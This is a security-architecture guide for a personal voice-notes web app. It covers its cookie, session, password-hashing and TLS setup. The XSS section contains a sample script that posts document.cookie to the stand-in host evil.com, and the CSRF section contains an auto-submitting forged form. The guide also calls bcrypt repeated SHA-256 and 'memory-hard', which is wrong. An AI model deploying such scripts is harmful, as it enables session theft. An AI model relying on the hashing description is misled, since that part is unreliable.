# 🔐 Athan Notes Security Architecture

**Visual Guide to How Your Data Is Protected**

---

## 🏗️ Security Layers (Defense in Depth)

```
┌─────────────────────────────────────────────────────────────┐
│                     YOUR DEVICE                             │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ LAYER 1: Device Security                              │  │
│  │ • Screen lock (Face ID / Touch ID / PIN)              │  │
│  │ • OS security updates                                 │  │
│  │ • Antivirus / malware protection                      │  │
│  │ • Physical security (don't leave unlocked)            │  │
│  └───────────────────────────────────────────────────────┘  │
│                          ↓                                  │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ LAYER 2: Browser Security                             │  │
│  │ • httpOnly cookies (JS can't access)                  │  │
│  │ • No sensitive data in localStorage                   │  │
│  │ • Same-origin policy enforced                         │  │
│  │ • Trusted extensions only                             │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                          ↓
                    HTTPS / TLS 1.3
             (All traffic encrypted)
                          ↓
┌─────────────────────────────────────────────────────────────┐
│                   VERCEL PLATFORM                           │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ LAYER 3: Network Security                             │  │
│  │ • TLS 1.3 encryption (256-bit)                        │  │
│  │ • secure: true cookies (HTTPS only)                   │  │
│  │ • sameSite: lax (CSRF protection)                     │  │
│  │ • HSTS enabled (force HTTPS)                          │  │
│  └───────────────────────────────────────────────────────┘  │
│                          ↓                                  │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ LAYER 4: Application Security                         │  │
│  │ • Server-side authentication checks                   │  │
│  │ • iron-session (AES-256 encrypted cookies)            │  │
│  │ • bcrypt password hashing (10 rounds)                 │  │
│  │ • Environment variable protection                     │  │
│  └───────────────────────────────────────────────────────┘  │
│                          ↓                                  │
│  ┌───────────────────────────────────────────────────────┐  │
│  │ LAYER 5: Data Security                                │  │
│  │ • Voice recordings: Never stored (ephemeral)          │  │
│  │ • API keys: Encrypted environment variables           │  │
│  │ • Secrets: Never in Git, never in client code         │  │
│  │ • Session data: Encrypted in cookie                   │  │
│  └───────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────┘
                          ↓
                  External Services
                          ↓
         ┌────────────────┴────────────────┐
         ↓                                 ↓
┌─────────────────┐              ┌─────────────────┐
│  Gemini AI API  │              │   Notion API    │
│  (Google)       │              │   (Notion)      │
├─────────────────┤              ├─────────────────┤
│ • Audio → Text  │              │ • Store notes   │
│ • API key auth  │              │ • API key auth  │
│ • HTTPS only    │              │ • HTTPS only    │
│ • Scoped access │              │ • DB-level scope│
└─────────────────┘              └─────────────────┘
```

---

## 🔄 Data Flow with Security Annotations

### Voice Note Recording Flow

```
┌──────────────────────────────────────────────────────────────────────┐
│ STEP 1: Recording                                                    │
└──────────────────────────────────────────────────────────────────────┘
    
    [User speaks into microphone]
              ↓
    🎤 Browser MediaRecorder API
       • Recorded in browser memory (not disk)
       • WebM/Opus format
       • Never leaves device until upload
              ↓
    📦 Audio Blob (binary data)
       • Exists only in JavaScript memory
       • Not accessible to other tabs/sites

┌──────────────────────────────────────────────────────────────────────┐
│ STEP 2: Upload (Encrypted Transit)                                   │
└──────────────────────────────────────────────────────────────────────┘

    🔒 HTTPS POST to /api/process-audio
       ├─ TLS 1.3 encryption (256-bit)
       ├─ Cookie: athan_session=Fe26.2**[encrypted]
       └─ Body: FormData { audio: blob }
              ↓
    ✅ Security Checks:
       1. Session cookie validated (iron-session decrypt)
       2. isLoggedIn === true?
       3. Audio file format validation
       4. File size limit check

┌──────────────────────────────────────────────────────────────────────┐
│ STEP 3: Server Processing (Ephemeral)                                │
└──────────────────────────────────────────────────────────────────────┘

    📥 Server receives audio
       ├─ Convert blob → base64 (for Gemini API)
       ├─ 🚫 NOT saved to disk
       ├─ 🚫 NOT stored in database
       └─ ⏱️ Exists in memory for ~2-5 seconds only
              ↓
    🔒 HTTPS POST to Gemini API
       ├─ Authorization: Bearer [GEMINI_API_KEY]
       ├─ Body: { audio: base64, mimeType: "audio/webm" }
       └─ TLS encryption
              ↓
    🤖 Gemini AI processes
       ├─ Transcribes Burmese speech
       ├─ Corrects spelling
       ├─ Normalizes text
       └─ Generates: title, content, summary, category, tags
              ↓
    📄 Text response received
       • Audio is now deleted from Gemini servers
       • Original audio deleted from your server memory
       • Only text remains

┌──────────────────────────────────────────────────────────────────────┐
│ STEP 4: Save to Notion (Encrypted Transit)                           │
└──────────────────────────────────────────────────────────────────────┘

    🔒 HTTPS POST to Notion API
       ├─ Authorization: Bearer [NOTION_API_KEY]
       ├─ Body: { properties: {...}, parent: {database_id} }
       └─ TLS encryption
              ↓
    💾 Notion stores note
       ├─ Title, content, summary, category, tags
       ├─ Stored in your private Notion database
       ├─ Encrypted at rest by Notion
       └─ Accessible only via your API key
              ↓
    ✅ Success response to client
       • Browser displays saved note
       • Session cookie still valid (httpOnly, secure)
```

---

## 🔐 Authentication Flow (Login Security)

```
┌──────────────────────────────────────────────────────────────────────┐
│ Login Request                                                        │
└──────────────────────────────────────────────────────────────────────┘

    👤 User enters credentials
       • Username: "admin"
       • Password: "MySecretPass123!"
              ↓
    🔒 HTTPS POST to /api/auth/login
       └─ TLS 1.3 encryption
              ↓
    🛡️ Server-side validation
       1. Username matches APP_USERNAME?
          └─ Compare: "admin" === process.env.APP_USERNAME
       2. Password matches hash?
          └─ bcrypt.compare("MySecretPass123!", APP_PASSWORD_HASH)
          └─ Hash: $2b$10$RNLy... (from environment)
       3. Both match? ✅ Proceed | ❌ Return 401 Unauthorized

┌──────────────────────────────────────────────────────────────────────┐
│ Session Creation (If Login Succeeds)                                 │
└──────────────────────────────────────────────────────────────────────┘

    📦 Create session data (plain object)
       {
         username: "admin",
         isLoggedIn: true,
         loggedInAt: 1737283200000  // Unix timestamp
       }
              ↓
    🔐 Encrypt with iron-session
       ├─ Algorithm: AES-256-CBC
       ├─ Key: SESSION_SECRET (512 bits)
       ├─ Salt: Random (generated per cookie)
       ├─ HMAC: SHA-256 signature
       └─ Result: "Fe26.2**abc123...xyz789"
              ↓
    🍪 Set-Cookie header
       Set-Cookie: athan_session=Fe26.2**abc123...xyz789; 
                   HttpOnly; 
                   Secure; 
                   SameSite=Lax; 
                   Max-Age=345600; 
                   Path=/
              ↓
    📱 Browser stores cookie
       • Saved in browser's secure cookie storage
       • NOT accessible via JavaScript (httpOnly)
       • Only sent over HTTPS (secure)
       • Expires in 4 days (345600 seconds)

┌──────────────────────────────────────────────────────────────────────┐
│ Authenticated Request (Using Session)                                │
└──────────────────────────────────────────────────────────────────────┘

    🌐 User navigates to /
       GET https://your-app.com/
       Cookie: athan_session=Fe26.2**abc123...xyz789
              ↓
    🔓 Server decrypts cookie
       1. Extract: Fe26.2**[salt]$[payload]$[hmac]
       2. Verify HMAC signature (prevent tampering)
       3. Decrypt payload with SESSION_SECRET
       4. Parse JSON: { username, isLoggedIn, loggedInAt }
              ↓
    ✅ Check: session.isLoggedIn === true?
       • YES → Render app page
       • NO  → redirect('/login')
```

---

## 🛡️ Attack Prevention Mechanisms

### 1. XSS (Cross-Site Scripting) Prevention

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attack Scenario: Malicious script tries to steal cookie              │
└──────────────────────────────────────────────────────────────────────┘

    😈 Attacker injects script
       <script>
         // Try to steal session cookie
         fetch('https://evil.com/steal', {
           method: 'POST',
           body: document.cookie  // Attempt to access cookie
         });
       </script>
              ↓
    🛑 httpOnly FLAG BLOCKS ACCESS
       document.cookie → ""  // Empty! No session cookie visible
              ↓
    ❌ Attack fails - cookie not accessible to JavaScript
```

**Protection:**
```typescript
cookieOptions: {
  httpOnly: true  // ✅ JavaScript CANNOT access cookie
}
```

---

### 2. CSRF (Cross-Site Request Forgery) Prevention

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attack Scenario: Evil site tries to use victim's session             │
└──────────────────────────────────────────────────────────────────────┘

    👤 User visits evil-site.com (while logged into your app)
              ↓
    😈 Evil site sends request
       <form action="https://your-app.com/api/process-audio" 
             method="POST">
         <input name="audio" value="fake-audio-data">
       </form>
       <script>document.forms[0].submit()</script>
              ↓
    🌐 Browser attempts to send request
       POST https://your-app.com/api/process-audio
       Origin: https://evil-site.com  ← Cross-site!
              ↓
    🛑 sameSite=lax BLOCKS COOKIE
       • Cookie NOT sent (cross-site POST blocked)
       • Server receives request WITHOUT session cookie
              ↓
    🔒 Server checks authentication
       session.isLoggedIn → undefined (no cookie received)
              ↓
    ❌ Returns 401 Unauthorized - Attack fails
```

**Protection:**
```typescript
cookieOptions: {
  sameSite: 'lax'  // ✅ Blocks cross-site POST requests
}
```

---

### 3. Network Sniffing Prevention

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attack Scenario: Attacker on same WiFi tries to intercept traffic    │
└──────────────────────────────────────────────────────────────────────┘

    📡 Public WiFi Network
       ├─ Your device (legitimate)
       └─ Attacker's device (sniffing)
              ↓
    👤 You send login request
       • Without HTTPS:
         ❌ POST http://app.com/login
         ❌ Body: { username: "admin", password: "MyPass123" }
         ❌ Cookie: athan_session=plaintext_value
         ↑ READABLE by attacker with Wireshark!
              ↓
    ✅ With HTTPS (Your App):
       🔒 POST https://your-app.com/login
       🔒 TLS 1.3 encryption wraps entire request:
          ┌────────────────────────────────────┐
          │ 🔐 ENCRYPTED PAYLOAD:              │
          │ a9f3b2e1c4d5...gibberish...7f8e9d  │
          └────────────────────────────────────┘
              ↓
    👀 Attacker sees:
       • Encrypted binary data (unreadable)
       • Destination IP (your-app.com)
       • Packet sizes/timing
       ❌ CANNOT see: password, session cookie, API keys
              ↓
    ❌ Attack fails - All data encrypted in transit
```

**Protection:**
```typescript
// your deployment server automatically provides HTTPS
cookieOptions: {
  secure: true  // ✅ Cookie only sent over HTTPS
}
```

---

### 4. Session Hijacking Prevention

```
┌──────────────────────────────────────────────────────────────────────┐
│ Attack Scenario: Attacker steals valid session cookie                │
└──────────────────────────────────────────────────────────────────────┘

    😈 Attacker gains physical access to unlocked device
              ↓
    🔓 Opens DevTools (F12)
       Application → Cookies → athan_session
       Value: Fe26.2**abc123...xyz789
              ↓
    📋 Copies cookie value
              ↓
    💻 On attacker's device:
       • Opens DevTools
       • Adds cookie manually:
         Name: athan_session
         Value: Fe26.2**abc123...xyz789  (stolen)
         Domain: your-app.com
              ↓
    🌐 Attacker visits your app
       GET https://your-app.com/
       Cookie: athan_session=Fe26.2**abc123...xyz789
              ↓
    🔓 Server decrypts cookie
       • Valid signature ✅
       • Valid encryption ✅
       • Session data: { isLoggedIn: true } ✅
              ↓
    ✅ Access granted (Attack succeeds)

┌──────────────────────────────────────────────────────────────────────┐
│ Mitigations (Damage Limitation)                                      │
└──────────────────────────────────────────────────────────────────────┘

    🛡️ Defense 1: httpOnly
       • Attacker MUST have physical access (can't use XSS)
    
    🛡️ Defense 2: 4-day expiry
       • Stolen cookie expires in 96 hours
       • Limits damage window
    
    🛡️ Defense 3: Logout button
       • User can destroy session immediately
       • New cookie generated on next login
    
    🛡️ Defense 4: Single-user app
       • User will notice unauthorized activity
       • Easy to detect compromise
    
    🛡️ Defense 5: Secure flag
       • Cookie won't work on HTTP (only HTTPS)
       • Reduces attack surface
```

**Best Practice:**
```
Always lock your device when not in use!
Use logout button when finished!
```

---

## 🔑 Password Security Deep Dive

### How Passwords Are Stored

```
┌──────────────────────────────────────────────────────────────────────┐
│ WRONG WAY (Never do this)                                            │
└──────────────────────────────────────────────────────────────────────┘

    ❌ Plain text storage:
       APP_PASSWORD=admin123
       
       If leaked → Instant compromise!

┌──────────────────────────────────────────────────────────────────────┐
│ RIGHT WAY (Your app)                                                 │
└──────────────────────────────────────────────────────────────────────┘

    ✅ bcrypt hashing:
    
    1. Generate hash (one-time setup):
       npm run hash-password
       Enter: admin123
              ↓
       bcrypt.hash("admin123", 10)
         • Generates random salt: kL9mN2pQ5r
         • Hashes with salt: SHA-256(SHA-256(...))
         • Repeats 2^10 = 1024 times (slow!)
              ↓
       Output: $2b$10$kL9mN2pQ5r...encrypted...ABC
                ↑   ↑  ↑         ↑          ↑
             Algo Ver Rounds   Salt      Hash
    
    2. Store hash in environment:
       APP_PASSWORD_HASH=$2b$10$kL9mN2pQ5r...ABC
    
    3. Verify login:
       bcrypt.compare("admin123", "$2b$10$kL9mN2pQ5r...ABC")
         • Extract salt: kL9mN2pQ5r
         • Hash input with same salt
         • Compare hashes
         • ✅ Match → Login succeeds
         • ❌ No match → Login fails
```

### Why This Is Secure

```
📊 Cracking Time Estimates:

Weak password ("password"):
  • Plain text: Instant
  • bcrypt (10 rounds): 2-3 hours

Medium password ("Admin123!"):
  • Plain text: Minutes
  • bcrypt (10 rounds): 2-3 weeks

Strong password ("rX9$mK2#pL5@qN8%"):
  • Plain text: Years
  • bcrypt (10 rounds): Centuries

Why bcrypt is slow (good for security):
  • Each attempt takes ~100ms
  • 1024 rounds = hard to brute force
  • GPU-resistant (memory-hard)
  • Salt prevents rainbow tables
```

---

## 📊 Security Audit Checklist

### Before Deployment

```
☐ Environment Variables
  ├─ ☐ .env.local in .gitignore
  ├─ ☐ SESSION_SECRET is 64+ chars random
  ├─ ☐ APP_PASSWORD_HASH uses bcrypt
  ├─ ☐ All secrets on your deployment server (not in code)
  └─ ☐ No secrets committed to Git

☐ Authentication
  ├─ ☐ All pages check session server-side
  ├─ ☐ All API routes check session
  ├─ ☐ Password uses bcrypt (10+ rounds)
  ├─ ☐ Session expires (4 days max)
  └─ ☐ Logout button destroys session

☐ Cookie Security
  ├─ ☐ httpOnly: true
  ├─ ☐ secure: true (production)
  ├─ ☐ sameSite: 'lax'
  ├─ ☐ maxAge: ≤ 7 days
  └─ ☐ Encrypted with iron-session

☐ Network Security
  ├─ ☐ Deployed on HTTPS (your deployment server)
  ├─ ☐ TLS 1.3 enabled
  ├─ ☐ HSTS header sent
  └─ ☐ No mixed content warnings

☐ Code Security
  ├─ ☐ No secrets in client-side JS
  ├─ ☐ No console.log of sensitive data
  ├─ ☐ Input validation on all forms
  ├─ ☐ API keys have minimal permissions
  └─ ☐ Dependencies updated (npm audit)
```

---

## 🎓 Security Terminology

| Term | Definition | Example |
|------|------------|---------|
| **Encryption** | Converting data to unreadable format | "admin123" → "Fe26.2**abc..." |
| **Hashing** | One-way conversion (can't reverse) | "password" → "$2b$10$RNLy..." |
| **Salt** | Random data added before hashing | "password" + "kL9m" → hash |
| **HTTPS/TLS** | Encrypted connection protocol | 🔒 https://... |
| **XSS** | Malicious script injection attack | `<script>steal()</script>` |
| **CSRF** | Cross-site request forgery | Evil site uses your session |
| **httpOnly** | Cookie flag blocking JS access | `document.cookie` returns "" |
| **Session** | Temporary authentication state | "Logged in for 4 days" |
| **Cookie** | Small data stored in browser | `athan_session=Fe26.2**...` |
| **Environment Variable** | Server-side secret configuration | `SESSION_SECRET=abc123...` |

---

## 🎯 Summary: Your Security Stack

```
┌─────────────────────────────────────────────────────────────┐
│                 ATHAN NOTES SECURITY                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  🔒 Encryption:  AES-256, TLS 1.3, bcrypt                   │
│  🍪 Cookies:     httpOnly, secure, sameSite                 │
│  🔐 Sessions:    iron-session (encrypted)                   │
│  🔑 Passwords:   bcrypt (10 rounds, salted)                 │
│  🌐 Network:     HTTPS only (your deployment server)                        │
│  🛡️ Defense:     XSS, CSRF, sniffing blocked                │
│  ⏰ Expiry:      4 days auto-logout                         │
│  🚪 Logout:      Destroys session immediately               │
│                                                             │
│  Risk Level:     🟢 LOW (for single-user PWA)               │
│  Compliance:     ✅ Industry-standard practices             │
│  Attack Surface: 🔒 Minimal (main risk = physical access)   │
│                                                             │
└─────────────────────────────────────────────────────────────┘

         🎯 Remember: Lock your device! 🎯
```

---

Last Updated: January 19, 2025
